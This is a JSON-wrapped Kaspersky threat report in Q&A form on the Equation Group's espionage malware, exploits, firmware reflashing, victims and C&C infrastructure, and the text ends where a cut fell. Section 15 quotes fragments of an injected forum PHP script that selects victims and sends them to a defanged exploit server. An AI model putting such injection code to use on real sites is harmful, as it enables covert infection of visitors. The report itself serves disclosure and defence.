{
    "id": "41a77f79-3d7c-46cf-ad60-f611b71c9f79",
    "created_at": "2022-10-25T16:48:22.877712Z",
    "updated_at": "2025-03-27T02:16:20.813997Z",
    "deleted_at": null,
    "sha1_hash": "41aa5bd1ed03d80650a89de3649d051f900b958b",
    "title": "Equation Group: Questions And Answers",
    "authors": "Kaspersky",
    "file_creation_date": "2015-02-24T10:34:14Z",
    "file_modification_date": "2015-02-24T10:34:31Z",
    "file_size": 4171137,
    "plain_text": "# EQUATION GROUP: QUESTIONS AND ANSWERS\n\nVersion: 1.5\nFebruary 2015\n\n[#EquationAPT](https://twitter.com/hashtag/equationapt)\n[#TheSAS2015](http://sas.kaspersky.com/)\n\n\n-----\n\n2\n\n## Table of contents\n\n1. What is the Equation group?...........................................................................3\n\n2. \u0007Why do you call them the “Equation” group?.................................................3\n\n3. \u0007What attack tools and malware does the Equation group use?...................4\n\n4. What is DOUBLEFANTASY?.............................................................................6\n\n5. What is EQUATIONDRUG?...............................................................................8\n\n6. What is GRAYFISH?..........................................................................................9\n\n7. What is Fanny?.............................................................................................. 12\n\n8. \u0007What exploits does the Equation group use?.............................................. 14\n\n9. \u0007How do victims get infected by EQUATION group malware?....................... 15\n\n10. \u0007What is the most sophisticated thing about the EQUATION group?.......... 16\n\n11. \u0007Have you observed any artifacts indicating who is behind\n\nthe EQUATION group?................................................................................... 19\n\n12. How many victims are there?....................................................................... 20\n\n13. \u0007Have you seen any non-Windows malware from the Equation group?...... 22\n\n14. \u0007What C&C infrastructure do the Equation group implants use?................ 23\n\n15. \u0007How do victims get selected for infection by the EQUATION group?.......... 23\n\n16. \u0007What kind of encryption algorithms are used by the EQUATION group?.... 27\n\n17. \u0007How does the EQUATION group’s attack platforms\n\ncompare with Regin?.................................................................................... 30\n\n18. How did you discover this malware?........................................................... 31\n\nIndicators of compromise (“one of each”).......................................................... 32\n\n\n-----\n\n3\n\n## 1. What is the Equation group?\n\nThe Equation group is a highly sophisticated threat actor that has been\nengaged in multiple CNE (computer network exploitation) operations dating\nback to 2001, and perhaps as early as 1996. The Equation group uses multiple\nmalware platforms, some of which surpass the well-known “Regin” threat in\ncomplexity and sophistication. The Equation group is probably one of the most\nsophisticated cyber attack groups in the world; and they are the most advanced\nthreat actor we have seen.\n\n## 2. \u0007Why do you call them the “Equation”\n group?\n\nWe call this threat actor the Equation group because of their love for encryption\nalgorithms and obfuscation strategies and the sophisticated methods used\nthroughout their operations. In general, the Equation group uses a specific\nimplementation of the RC5 encryption algorithm throughout their malware.\nSome of the most recent modules use RC6, RC4 and AES too, in addition to\nother cryptographic functions and hashes.\n\nOne technique in particular caught our attention and reminded us of another\ncomplex malware, Gauss. The GrayFish loader uses SHA-256 one thousand\ntimes over the unique NTFS object ID of the victim’s Windows folder to decrypt\nthe next stage from the registry. This uniquely ties the infection to the specific\nmachine, and means the payload cannot be decrypted without knowing the\nNTFS object ID.\n\n\n-----\n\n4\n\n## 3. \u0007What attack tools and malware does\n the Equation group use?\n\nSo far, we’ve identified several malware platforms used exclusively by the Equation\ngroup.\n\nThey are:\n\n- EQUATIONDRUG – A very complex attack platform used by the group on\n\nits victims. It supports a module plugin system, which can be dynamically\nuploaded and unloaded by the attackers.\n\n- DOUBLEFANTASY – A validator-style Trojan, designed to confirm the target\n\nis the intended one. If the target is confirmed, they get upgraded to a more\nsophisticated platform such as EQUATIONDRUG or GRAYFISH.\n\n- EQUESTRE – Same as EQUATIONDRUG.\n\n- TRIPLEFANTASY – Full-featured backdoor sometimes used in tandem with\n\nGRAYFISH. Looks like an upgrade of DOUBLEFANTASY, and is possibly a more\nrecent validator-style plugin.\n\n- GRAYFISH – The most sophisticated attack platform from the EQUATION\n\ngroup. It resides completely in the registry, relying on a bootkit to gain\nexecution at OS startup.\n\n- FANNY – A computer worm created in 2008 and used to gather information\n\nabout targets in the Middle East and Asia. Some victims appear to have been\nupgraded first to DoubleFantasy, and then to the EQUATIONDRUG system.\nFanny used exploits for two zero-day vulnerabilities which were later discovered\nwith Stuxnet.\n\n- EQUATIONLASER – An early implant from the EQUATION group, used around\n\n2001-2004. Compatible with Windows 95/98, and created sometime between\nDOUBLEFANTASY and EQUATIONDRUG.\n\n\n-----\n\n5\n\n\n-----\n\n6\n\n## 4. What is DOUBLEFANTASY?\n\nThe Equation group uses an implant known as DoubleFantasy (the internal\nKaspersky Lab name) for the validation of their victims. The implant serves\ntwo purposes:\n\n- to confirm if the victim is interesting; If so, the victim is upgraded\n\nto the EquationDrug or GrayFish platforms\n\n- to keep a backdoor into a potentially interesting target’s computer\n\nDoubleFantasy keeps an internal version number in its configuration block,\ntogether with other data such as legitimate hosts used to validate the internet\nconnection (e.g.: microsoft.com, yahoo.com) and C&Cs.\n\nDecrypted DoubleFantasy configuration block\n\nIn the configuration block above, one can easily spot the internal version 8.2.0.6.\n\nDecrypting configuration blocks from all known DoubleFantasy samples, we\nobtained the following internal version numbers:\n\n- `8.1.0.4`\n\n- `008.002.000.006`\n\n- `008.002.001.001`\n\n- `008.002.001.004`\n\n- `008.002.001.04A (subversion “IMIL3.4.0-IMB1.8.0”)`\n\n- `008.002.002.000`\n\n- `008.002.003.000`\n\n- `008.002.005.000`\n\n- `008.002.006.000`\n\n\n-----\n\n7\n\n- `011.000.001.001`\n\n- `012.001.000.000`\n\n- `012.001.001.000`\n\n- `012.002.000.001`\n\n- `012.003.001.000`\n\n- `012.003.004.000`\n\n- `012.003.004.001`\n\n- `013.000.000.000`\n\nInterestingly, the most popular versions are 8 and 12:\n\nConsidering the latest version of DoubleFantasy is 13 and we have only identified\n4 major versions, we are probably seeing only a small part of the group’s activity.\n\n\n-----\n\n8\n\n## 5. What is EQUATIONDRUG?\n\nEQUATIONDRUG is one of the group’s most complex espionage platforms.\nThe platform was developed between 2003 and 2013 and subsequently\nreplaced by GrayFish. It appears to have been created as an upgrade from\nthe EQUATIONLASER platform.\n\nA victim doesn’t immediately get infected with EQUATIONDRUG. First, the\nattackers infect them with DOUBLEFANTASY, which is a validator-style plugin.\nIf the victim is confirmed as interesting to the attackers, the EQUATIONDRUG\ninstaller is delivered.\n\nBy default, a core set of modules is installed onto the target’s computer together\nwith EQUATIONDRUG, giving attackers full control over the operating system. In\ncases where the basic features of the malware are not enough, EquationDrug\nsupports the addition of new plugins to extend its functionality. We found 35\ndifferent plugins for EquationDrug and 18 drivers.\n\n\n-----\n\n9\n\nEquationDrug’s core modules, designed for hooking deep into the OS, do not\ncontain a trusted digital signature and cannot be run directly on modern operating\nsystems. The code checks whether the OS version predates Windows XP/2003.\nSome of the plugins were designed originally for use on Windows 95/98/ME.\n\nIf the target is using a modern operating system such as Windows 7, the attackers\nuse the TripleFantasy or GrayFish platforms.\n\nEquationDrug has an integrated countdown timer, presumably designed to selfdestruct if commands are not received from the C&C for a period of time (several\nmonths).\n\nThe information stolen from the PC and prepared for transmission to the C&C\nis stored in encrypted form throughout several fake font files (*.FON) inside the\nWindows\\Fonts folder on the victim's computer.\n\n## 6. What is GRAYFISH?\n\nGRAYFISH is the most modern and sophisticated malware implant from\nthe Equation group. It is designed to provide an effective (almost “invisible”)\npersistence mechanism, hidden storage and malicious command execution\ninside the Windows operating system.\n\nBy all indications, GrayFish was developed between 2008 and 2013 and is\ncompatible with all modern versions of Microsoft’s operating systems, including\nWindows NT 4.0, Windows 2000, Windows XP, Windows Vista, Windows 7 and 8 –\nboth 32-bit and 64-bit versions.\n\n\n-----\n\n10\n\nGrayFish includes a highly sophisticated bootkit, which is more complex than any\nwe’ve seen before. This suggests developers of the highest caliber are behind its\ncreation.\n\nWhen the computer starts, GrayFish hijacks the OS loading mechanisms by injecting\nits code into the boot record. This allows it to control the launching of Windows\nat each stage. In fact, after infection, the computer is not run by itself more: it is\nGrayFish that runs it step by step, making the necessary changes on the fly.\n\nAfter GrayFish starts Windows, it launches a multi-stage mechanism (four to five\nstages) of decryption to achieve code execution within the Windows environment.\nIt then runs the functional modules that are stored inside the Windows registry.\nEach stage decodes and executes the next, and the entire platform will only start\nafter successful execution of all levels If an error happens during launch the\n\n\n-----\n\n11\n\n\n-----\n\n12\n\nTo store stolen information, as well as its own auxiliary information, GrayFish\nimplements its own encrypted Virtual File System (VFS) inside the Windows registry.\n\nTo bypass modern OS security mechanisms that block the execution of untrusted\ncode in kernel mode, GrayFish exploits several legitimate drivers, including one\nfrom the CloneCD program. This driver (ElbyCDIO.sys) contains a vulnerability which\nGrayFish exploits to achieve kernel-level code execution. Despite the fact that the\n[vulnerability was discovered in 2009, the digital signature has not yet been revoked.](http://www.securitylab.ru/lab/PT-2009-11)\n\nThe GrayFish implementation appears to have been designed to make it invisible\nto antivirus products. When used together with the bootkit, all the modules as well\nas the stolen data are stored in encrypted form in the registry and dynamically\ndecrypted and executed. There are no malicious executable modules at all on\nthe filesystem of an infected system.\n\nAn interesting observation: the first stage GRAYFISH loader computes the SHA-256\nhash of the NTFS of system folder (%Windows% or %System%) Object_ID one\nthousand times. The result is used as an AES decryption key for the next stage.\nThis is somewhat similar to Gauss, which computed the MD5 hash over the\nname of its target folder 10,000 times and used the result as the decryption key.\n\n## 7. What is Fanny?\n\nFanny is a computer worm created by the Equation group in 2008 and distributed\nthroughout the Middle East and Asia. Fanny used two zero-day exploits, which\nwere later uncovered during the discovery of Stuxnet. To spread, it used the Stuxnet\nLNK exploit and USB sticks. For escalation of privilege, Fanny used a vulnerability\npatched by the Microsoft bulletin MS09-025, which from 2009 was also used in\none of the early versions of Stuxnet.\n\n\n-----\n\n13\n\nIt’s important to point out that these two exploits were used in Fanny before\nthey were integrated into Stuxnet, indicating the EQUATION group had access\nto these zero-days before the Stuxnet group. Actually, the similar type of usage\nof both exploits together in different computer worms, at around the same time,\nindicates that the EQUATION group and the Stuxnet developers are either the\nsame or working closely together.\n\nFanny malware diagram\n\nThe main purpose of Fanny appears to have been the mapping of air-gapped\nnetworks. For this, it used a unique USB-based command and control mechanism.\nWhen a USB stick is infected, Fanny creates a hidden storage area on the stick.\nIf it infects a computer without an internet connection, it will collect basic system\ninformation and save it onto the hidden area of the stick. Later, when a stick\ncontaining hidden information is plugged into an internet-connected computer\ninfected by Fanny, the data will be scooped up from the hidden area and sent to\nthe C&C. If the attackers want to run commands on the air-gapped networks, they\ncan save these commands in the hidden area of the USB stick When the stick is\n\n\n-----\n\n14\n\nexecute them. This effectively allowed the Equation group to run commands inside\nair-gapped networks through the use of infected USB sticks, and also map the\ninfrastructure of such networks.\n\nThe Fanny C&C server is currently sinkholed by Kaspersky Lab. The victims map\nlooks as follows:\n\n2014-2015 Fanny sinkhole statistics\n\n## 8. \u0007What exploits does the Equation\n group use?\n\nWe observed the following exploits used by the Equation group in their malware:\n\n- Windows Kernel EoP exploit used in Stuxnet 2009 (atempsvc.ocx),\n\nfixed with MS09-025. (CVE unknown).\n\n- TTF exploit fixed with MS12-034 (possibly CVE-2012-0159).\n\n- TTF exploit fixed with MS13-081 (possibly CVE-2013-3894).\n\n- LNK vulnerability as used by Stuxnet. (CVE-2010-2568).\n\n- CVE-2013-3918 (Internet Explorer).\n\n\n-----\n\n15\n\n- CVE-2012-1723 (Java).\n\n- CVE-2012-4681 (Java).\n\nAt least four of these were used as zero-days by the EQUATION group. In addition\nto these, we observed the use of unknown exploits, possibly zero-day, against\nFirefox 17, as used in the TOR Browser.\n\nAn interesting case is the use of CVE-2013-3918, which was originally used\nby the APTgroup behind the 2009 Aurora attack. The EQUATION group captured\ntheir exploit and repurposed it to target government users in Afghanistan.\n\n## 9. \u0007How do victims get infected by EQUATION\n group malware?\n\nThe Equation group relies on multiple techniques to infect their victims. These\ninclude:\n\n- Self-replicating (worm) code – Fanny\n\n- Physical media, CD-ROMs\n\n- USB sticks + exploits\n\n- Web-based exploits\n\nThe attacks that use physical media (CD-ROMs) are particularly interesting\nbecause they indicate the use of a technique known as “interdiction”, where\nthe attackers intercept shipped goods and replace them with Trojanized versions.\n\nOne such incident involved targeting participants at a scientific conference\nin Houston. Upon returning home, some of the participants received by mail a copy of\nthe conference proceedings, together with a slideshow including various conference\nmaterials. The compromised CD-ROM used “autorun.inf” to execute an installer\nthat began by attempting to escalate privileges using two known EQUATION group\nexploits. Next, it attempted to run the group’s DOUBLEFANTASY implant and install\nit onto the victim’s machine. The exact method by which these CDs were interdicted\nis unknown. We do not believe the conference organizers did this on purpose. At the\nsame time, the super-rare DOUBLEFANTASY malware, together with its installer with\ntwo zero-day exploits, don’t end up on a CD by accident.\n\nAnother example is a Trojanized Oracle installation CD that contains\n\n\n-----\n\n16\n\nHere’s a look at a typical infection cycle:\n\nInfection lifecycle: from web exploit to EquationDrug and GrayFish\n\n## 10. \u0007What is the most sophisticated thing\n about the EQUATION group?\n\nAlthough the implementation of their malware systems is incredibly complex,\nsurpassing even Regin in sophistication, there is one aspect of the EQUATION\ngroup’s attack technologies that exceeds anything we have ever seen before.\nThis is the ability to infect the hard drive firmware.\n\nWe were able to recover two HDD firmware reprogramming modules from the\nEQUATIONDRUG and GRAYFISH platforms. The EQUATIONDRUG HDD firmware\nreprogramming module has version 3.0.1 while the GRAYFISH reprogramming\nmodule has version 4.2.0. These were compiled in 2010 and 2013, respectively,\nif we are to trust the PE timestamps.\n\n\n-----\n\n17\n\nThe EQUATION group HDD firmware reprogramming plugin has the internal\nID 80AA, which is a unique number in the groups’ plugin ID table. This allows\nother plugins to identify and use it as required. Both 32- and 64-bit versions\nof the plugin were found.\n\nThe plugin supports two main functions: reprogramming the HDD firmware\nwith a custom payload from the EQUATION group, and providing an API into\na set of hidden sectors (or data storage) of the hard drive. This achieves several\nimportant things:\n\n- Extreme persistence that survives disk formatting and OS reinstall.\n\n- An invisible, persistent storage hidden inside the hard drive.\n\nThe plugin version 3 has the ability to reprogram six drive “categories”:\n\n- “Maxtor”, “Maxtor STM”\n\n- “ST”, “Maxtor STM”, <Seagate Technology>\n\n- “WDC WD”, <Western Digital Technologies, Inc>\n\n- “SAMSUNG”, <SAMSUNG ELECTRONICS CO. LTD>\n\n- “WDC WD”, <Western Digital Technologies, Inc> additional vendor specific\n\nchecks used (spawns two subclasses)\n\n- <Seagate Technology>\n\nThe plugin version 4 is more complex and can reprogram 12 drive “categories”.\n\n\n-----\n\n18\n\nThe classes supported are:\n\n- “WDC WD”, <Western Digital Technologies Inc> additional vendor specific\n\nchecks used\n\n- “ST”, “Maxtor STM”, “SEAGATE ST”, <Seagate Technology>\n\n- “SAMSUNG”, <SAMSUNG ELECTRONICS CO., LTD.>\n\n- “WDC WD”, <Western Digital Technologies, Inc.> additional vendor specific\n\nchecks used\n\n- <HGST a Western Digital Company>, “IC”, “IBM”, “Hitachi”, “HTS”, “HTE”,\n\n“HDS”, “HDT”, “ExcelStor”\n\n- “Max”, “Maxtor STM”\n\n- <MICRON TECHNOLOGY, INC.>, “C300”, “M4”\n\n- <HGST a Western Digital Company>, <TOSHIBA CORPORATION>\n\n- “OCZ”, “OWC”, “Corsair”, “Mushkin” additional vendor specific checks used\n\n- <Samsung Electronics Co., Ltd., Storage System Division>, <Seagate\n\nTechnology>, <SAMSUNG ELECTRONICS CO., LTD.> +additional checks\n\n- <TOSHIBA CORPORATION COMPUTER DIVISION>, “TOSHIBA M” +checks\n\n- <Seagate Technology>, “ST”\n\nThe main function to reflash the HDD firmware receives an external payload, which\ncan be compressed by LZMA. The disk is targeted by a specific serial number and\nreprogrammed by a series of ATA commands. For example, in the case of Seagate\ndrives, we see a chain of commands: “FLUSH CACHE” (E7) → “DOWNLOAD\nMICROCODE” (92) → “IDENTIFY DEVICE” (EC) → WRITE “LOG EXT” (3F). Depending\non the reflashing request, there might be some unclear data manipulations written\nto the drive using “WRITE LOG EXT” (3F). For WD drives, there is a sub-routine\nsearching for ARM NOP opcodes in read data, and then used further in following\nwrites. Overall, the plugin uses a lot of undocumented, vendor-specific ATA\ncommands, for the drives mentioned above as well as all the others.\n\nThe EQUATION group’s HDD firmware reprogramming module is extremely rare.\nDuring our research, we’ve only identified a few victims who were targeted by this\nmodule. This indicates that it is probably only kept for the most valuable victims\nor for some very unusual circumstances.\n\n\n-----\n\n19\n\n## 11. \u0007Have you observed any artifacts\n indicating who is behind the EQUATION group?\n\nWith threat actor groups as skilled as the Equation team, mistakes are rare.\nNevertheless, they do happen. Some of the keywords forgotten in the modules\nthat we analyzed include:\n\n- SKYHOOKCHOW\n\n- prkMtx – unique mutex used by the Equation group’s exploitation library\n\n(“PrivLib”)\n\n- “SF” – as in “SFInstall”, “SFConfig”\n\n- “UR”, “URInstall” – “Performing UR-specific post-install...”\n\n- “implant” – from “Timeout waiting for the “canInstallNow” event from the\n\nimplant-specific EXE!”\n\n- STEALTHFIGHTER –\n\n(VTT/82055898/STEALTHFIGHTER/2008-10-16/14:59:06.229-04:00)\n\n- DRINKPARSLEY –\n\n(Manual/DRINKPARSLEY/2008-09-30/10:06:46.468-04:00)\n\n- STRAITACID –\n\n(VTT/82053737/STRAITACID/2008-09-03/10:44:56.361-04:00)\n\n- LUTEUSOBSTOS –\n\n(VTT/82051410/LUTEUSOBSTOS/2008-07-30/17:27:23.715-04:00)\n\n- STRAITSHOOTER STRAITSHOOTER30.exe\n\n- DESERTWINTER –\n\nc:\\desert~2\\desert~3\\objfre_w2K_x86\\i386\\DesertWinterDriver.pdb\n\n- GROK – standalonegrok_2.1.1.1\n\n- “RMGREE5” – c:\\users\\rmgree5\\...\n\n\n-----\n\n20\n\nInterestingly, the VTT strings above appear to contain a timestamp and an\ninfection counter. Between four events – 10 October 2008, 30th of July 2008,\n3rd of September 2008 and 30 of September 2008 – we count an average of\n2000 infections per month, if the serial number increases linearly. This could\nindicate that the EQUATION group hits about 2000 users per month, although\nit’s possible some “uninteresting” victims may be disinfected.\n\n[Note: \u0007The codename GROK appears in several documents published by Der Spiegel,](http://www.itnews.com.au/News/374987,nsa-spreads-malware-on-an-industrial-scale.aspx)\n\nwhere “a keylogger” is mentioned. Our analysis indicates EQUATIONGROUP’s\nGROK plugin is indeed a keylogger on steroids that can perform many other\nfunctions.\n\n## 12. How many victims are there?\n\nThe victims of the Equation group were observed in more than 30 countries,\nincluding Iran, Russia, Syria, Afghanistan, Kazakhstan, Belgium, Somalia,\nHong Kong, Libya, United Arab Emirates, Iraq, Nigeria, Ecuador, Mexico,\nMalaysia, United States, Sudan, Lebanon, Palestine, France, Germany,\nSingapore, Qatar, Pakistan, Yemen, Mali, Switzerland, Bangladesh,\nSouth Africa, Philippines, United Kingdom, India and Brazil.\n\n\n-----\n\n21\n\nVictims generally fall into the following categories:\n\n- Governments and diplomatic institutions\n\n- Telecommunication\n\n- Aerospace\n\n- Energy\n\n- Nuclear research\n\n- Oil and gas\n\n- Military\n\n- Nanotechnology\n\n- Islamic activists and scholars\n\n- Mass media\n\n- Transportation\n\n- Financial institutions\n\n- Companies developing cryptographic technologies\n\nCombining statistics from KSN and our sinkhole, we counted more than\n500 victims worldwide. A lot of infections have been observed on servers, often\ndomain controllers, data warehouses, website hosting and other types of servers.\nAt the same time, the infections have a self-destruct mechanism, so we can\nassume there were probably tens of thousands of infections around the world\nthroughout the history of the Equation group’s operations.\n\nAs an interesting note, some of the “patients zero” of Stuxnet seem to have been\ninfected by the EQUATION group. It is quite possible that the EQUATION group\nmalware was used to deliver the STUXNET payload.\n\n\n-----\n\n22\n\n## 13. \u0007Have you seen any non-Windows\n malware from the Equation group?\n\nAll the malware we have collected so far is designed to work on Microsoft’s\nWindows operating system. However, there are signs that non-Windows malware\ndoes exist. For instance, one of the sinkholed C&C domains is currently receiving\nconnections from a large pool of victims in China that appear to be Mac OS X\ncomputers (based on the user-agent).\n\nThe malware callbacks are consistent with the DOUBLEFANTASY schema, which\nnormally injects into the system browser (for instance, Internet Explorer on\nWindows).\n\nThe callbacks for the suspected Mac OS X versions have the following user\nagents:\n\n- Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17\n\n(KHTML, like Gecko) Version/6.0.2 Safari/536.26.17\n\n- Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101\n\nFirefox/21.0\n\n- Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10\n\n(KHTML, like Gecko) Version/6.0.3 Safari/536.28.10\n\nThis leads us to believe that a Mac OS X version of DOUBLEFANTASY also exists.\n\nAdditionally, we observed that one of the malicious forum injections, in the form\nof a PHP script, takes special precautions to show a different type of HTML code to\nApple iPhone visitors. Unlike other cases, such as visitors from Jordan, which does\nnot get targeted, iPhone visitors are redirected to the exploit server, suggesting the\nability to infect iPhones as well.\n\n\n-----\n\n23\n\n## 14. \u0007What C&C infrastructure do the Equation\n group implants use?\n\nThe Equation group uses a vast C&C infrastructure that includes more than\n300 domains and more than 100 servers. The servers are hosted in multiple\ncountries, including the US, UK, Italy, Germany, Netherlands, Panama, Costa Rica,\nMalaysia, Colombia and Czech Republic.\n\nAll C&C domains appear to have been registered through the same two major\nregistrars, using “Domains By Proxy” to mask the registrant’s information.\n\nKaspersky Lab is currently sinkholing a couple dozen of the 300 C&C servers.\n\n## 15. \u0007How do victims get selected for infection\n by the EQUATION group?\n\nThe EQUATION group sometimes selects its victims with surgical precision.\nWhen precision is not possible, the victims are targeted by a validator\n(DOUBLEFANTASY) implant and subsequently disinfected if they do not appear to\nbe “interesting” to the attackers.\n\nHere are some web-based targeting examples from the Equation group:\n\nOn March 2, 2013, a Kaspersky Lab user browsing an online forum was attacked\nwith an exploit from one of the Equation group’s exploitation servers:\n\n2013-03-02 –\ntechnicalconsumerreports[.]com/modular/assemble.php?params=YoGKKdExT[snip]\ncS5kS5t0bvGQyB8miDu+Agn – detected HEUR:Exploit.Script.Generic\n\nThe attack was unsuccessful as it was caught by our product and the user was\nprotected. The attack was targeting Firefox 17 (TOR Browser), using an unknown\nexploit that we have not recovered.\n\nLooking further, we identified a few other known Equation servers used in similar\nattacks even earlier:\n\n\n-----\n\n24\n\nThese attacks were delivered in several ways – for example, while the user\nvisited a number of Islamic Jihadist discussion forums, or via advertisements on\npopular websites in the Middle East.\n\nThe forums in question appear to have been compromised by a specific PHP\nscript that exploited only authenticated visitors. We were able to obtain one of\nthese PHP scripts embedded in a discussion forum:\n\nMalicious PHP script injected into hacked discussion forums\n\nThis PHP script provides a multitude of interesting information about the attacks.\nIt was first designed to work as part of vBulletin, a commercial forum platform. It\nspecifically checks if the visitor’s username MD5 matches two values:\n\n- 84b8026b3f5e6dcfb29e82e0b0b0f386 – MD5 of “Unregistered”\n\n- e6d290a03b70cfa5d4451da444bdea39 – unknown MD5\n\nIn practice, this means that only logged-in users will be exploited. Next, the PHP\nexploitation script checks if the user comes from a specific address range:\n\n- if(preg_match('/^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|7\n\n9.173.|85.159.|94.249.|86.108.)/',IPADDRESS)){return \"\";}\n\n\n-----\n\n25\n\nConverting the ranges to their respective countries (except for 64.38.3.50, which\nis the only specific IP mentioned) we get the following TOP 3 countries that will\nNOT be exploited:\n\n1. Jordan\n2. Turkey\n3. Egypt\nThis means that the attackers have taken special care not to infect users visiting\nfrom certain ISPs in these countries. If the visitors are from any other IP range,\nthe PHP script constructs an exploitation URL which includes the logged in\nvBulletin forum name:\n\n$htt=\"http://technology-revealed[.]com/expand/order.php?design=ABRSRgDQlkUALAxGANDrRu\nQQofe6Y0THS8E3hfBC+M+k7CdBmTH5gAkLvgV8EV3ULW+7KoUjbJ4UOFU6SVOtgEK7zTgPPNoDH\nz4vKecDGe7OzDmJlvwKvc5uYg/I/5x9\";\n\n$htt=$htt.\"&sn=\".bin2hex(substr($u,0,14));\n\nThe vBulletin forum username is stored in hex, as the “sn=” parameter to the\nexploit site. The exploit site can choose to hit the visitor with an exploit depending\non the username, meaning that the attackers are taking great care to infect only\nvery specific targets on these forums.\n\nInterestingly, the PHP script produces a different HTML page for iPhone visitors:\n\n- if (preg_match('/iPhone/',$_SERVER['HTTP_USER_AGENT'])){$scroll='yes';}\n\nThis indicates that the exploit server is probably aware of iPhone visitors and can\ndeliver exploits for them as well; otherwise, the exploitation URL can simply be\nremoved for these visitors.\n\nMost recently, the attackers used Java exploits, delivered through a specific\nserver to visitors from the Middle East via advertising networks on popular\nwebsites. Here’s an example:\n\n\n-----\n\n26\n\nThese 2013-2014 attacks make use of a new domain,\nstandardsandpraiserepurpose[.]com. Interesting to point out the similarity\nin the URL construction, with parameters “rr=1”, followed by “h=” a value\nresembling a SHA1 hash, possibly the specific targeted username. Other\ncollected “h=” values include the following:\n\n0044c9bfeaac9a51e77b921e3295dcd91ce3956a\n\n06cf1af1d018cf4b0b3e6cfffca3fbb8c4cd362e\n\n3ef06b6fac44a2a3cbf4b8a557495f36c72c4aa6\n\n5b1efb3dbf50e0460bc3d2ea74ed2bebf768f4f7\n\n930d7ed2bdce9b513ebecd3a38041b709f5c2990\n\ne9537a36a035b08121539fd5d5dcda9fb6336423\n\nConsidering the length and format, one might suspect they are a SHA1 hash,\nhowever, unlike the forum MD5 hashes, we couldn’t break any of them.\n\nThe exploits from standardsandpraiserepurpose[.]com targeted several\nKaspersky Lab users and were all unsuccessful. The server attempts three\ndifferent Java exploits, containing the same payload stored as “info.dat” inside\nthe Java archive. These are simple downloaders that contain shellcode to\ndownload and execute the next stage from the C&C:\n\nUnfortunately, we weren’t able to download a copy of the next stage as the\nURL was already dead at the time of checking, or else it is only served and\nbuilt specifically for victims at specific IPs. Another unusual aspect of targeting\nincluded multiple infection attempts against users of a certain satellite internet\nprovider in Afghanistan.\n\n\n-----\n\n27\n\n## 16. \u0007What kind of encryption algorithms\n are used by the EQUATION group?\n\nThe Equation group uses the RC5 and RC6 encryption algorithms quite\nextensively throughout their creations. They also use simple XOR, substitution\ntables, RC4 and AES.\n\nRC5 and RC6 are two encryption algorithms designed by Ronald Rivest in 1994\nand 1998. They are very similar to each other, with RC6 introducing an additional\nmultiplication in the cypher to make it more resistant. Both cyphers use the same\nkey setup mechanism and the same magical constants named P and Q.\n\nThe RC5/6 implementation from Equation group’s malware is particularly\ninteresting and deserves special attention because of its specifics.\n\nEncryption-related code in a DoubleFantasy sample\n\nIn the screenshot above, one can observe the main loop of a RC6 key setup\nsubroutine extracted from one of the Equation group samples.\n\n\n-----\n\n28\n\nThis is how it looks in pseudocode:\n\n*(_DWORD *)buf = 0xB7E15163;\n\ni = 1;\n\ndo\n\n{\n\n*(_DWORD *)(buf + 4 * i) = *(_DWORD *)(buf + 4 * i – 4) – 0x61C88647;\n\n++i;\n\n}\n\nwhile ( i < 44 );\n\nOne immediately notices the constants 0xB7E15163 and 0x61C88647.\n\nHere’s what a normal RC6 key setup code looks like:\n\nvoid RC5_SETUP(unsigned char *K) /* secret input key K[0...b-1] */\n\n{ WORD i, j, k, u=w/8, A, B, L[c];\n\n/* Initialize L, then S, then mix key into S */\n\nfor (i=b-1,L[c-1]=0; i!=-1; i--) L[i/u] = (L[i/u]<<8)+K[i];\n\nfor (S[0]=0xB7E15163,i=1; i<t; i++) S[i] = S[i-1]+0x9E3779B9;\n\n[...]\n\n}\n\n[See: http://www.ussrback.com/crypto/misc/rc5ref.c](http://www.ussrback.com/crypto/misc/rc5ref.c)\n\nInterestingly, the so-called Q constant usage is a bit different in the reference code.\n\nInside the Equation group malware, the encryption library uses a subtract operation\nwith the constant 0x61C88647. In most publicly available RC5/6 code, this\nconstant is usually stored as 0x9E3779B9, which is basically -0x61C88647.\nSince an addition is faster on certain hardware than a subtraction, it makes sense\nto store the constant in its negative form and adding it instead of subtracting.\n\n\n-----\n\n29\n\n[RC5 key setup reference document RFC2040 (https://tools.ietf.org/html/rfc2040)](https://tools.ietf.org/html/rfc2040)\n\nSearching for “0x61C88647 0xB7E15163” on Google results in barely two pages\nof results, indicating this combination of constants is relatively rare. Most of the hits\nare on Chinese forums.\n\nSearching for the 2-inverse constant “0x9E3779B9 0xB7E15163” results in\na whopping 2500 hits.\n\n\n-----\n\n30\n\nInterestingly, Regin implements the same constants in its RC5 code. Here’s how\nthe RC5 key setup code looks in Regin:\n\nIn total, we identified 20 different compiled versions of the RC5/6 code in\nthe Equation group malware. Although similar, the RC5 code is a bit different\nin Regin – none of the known Equation samples uses the “C7 41 10” opcode\nfor setting up the P constant, as Regin does.\n\nThis suggests that the EQUATION group and the Regin group are two different\nentities.\n\n## 17. \u0007How does the EQUATION group’s attack\n platforms compare with Regin?\n\nTo attack their victims, the EQUATION group used several cyberespionage\nplatforms over the last 14 years. These include:\n\n- EQUATIONLASER – around 2001-2003\n\n- EQUATIONDRUG – 2003 to 2013\n\n- GRAYFISH 1.0 – 2008-present\n\n- GRAYFISH 2.0 – 2012-present\n\n\n-----\n\n31\n\nWith EQUATIONDRUG, we observed the use of virtual file systems, which is also one\nof the trademarks of the Regin group. This was taken to further extreme in GRAYFISH,\nwhich exclusively uses the registry to store all malware-related modules and data in\nencrypted format. The GRAYFISH registry-based architecture is more flexible, stealthy\nand more complex than Regin, for several reasons:\n\n- It doesn’t use any files on disk which can be easily spotted by anomaly finders.\n\n- Each registry branch is encrypted with its own key, making decryption impossible\n\nwithout having the whole package.\n\n- Registry storage offers better granularity and less wasted space than Regin’s\n\nVFSes.\n\nIn addition, we can compare the two platforms by their startup mechanisms.\nWhile 64-bit Regin uses a service that loads the remaining of the code from the\nend of the last partition on disk and further from the VFSes, GRAYFISH takes this\na step further. The GRAYFISH bootkit starts from the VBR, loads the operating\nsystem and hijacks the loading of the first driver in the kernel. Next, it loads all\nthe other malware stages from the registry, making it almost completely invisible\nin terms of footprint.\n\nFinally, in terms of advanced features, GRAYFISH and EQUATIONDRUG include\nperhaps the most sophisticated persistence mechanism we’ve ever seen: re-flashing\nthe HDD firmware. Due to the complexity of this process 